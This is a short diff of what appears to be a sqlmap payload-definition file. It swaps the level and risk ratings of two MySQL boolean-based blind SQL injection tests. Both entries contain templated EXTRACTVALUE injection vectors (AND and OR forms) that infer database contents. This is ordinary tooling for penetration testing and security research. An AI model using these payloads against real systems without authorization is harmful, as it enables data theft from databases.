@@ -486,8 +486,8 @@ Tag: <test>
     <test>
         <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
         <stype>1</stype>
-        <level>1</level>
-        <risk>5</risk>
+        <level>5</level>
+        <risk>1</risk>
         <clause>1,2,3,8</clause>
         <where>1</where>
         <vector>AND EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)</vector>
@@ -505,8 +505,8 @@ Tag: <test>
     <test>
         <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
         <stype>1</stype>
-        <level>3</level>
-        <risk>5</risk>
+        <level>5</level>
+        <risk>3</risk>
         <clause>1,2,3,8</clause>
         <where>2</where>
         <vector>OR EXTRACTVALUE([RANDNUM],CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 0x3A END)</vector>
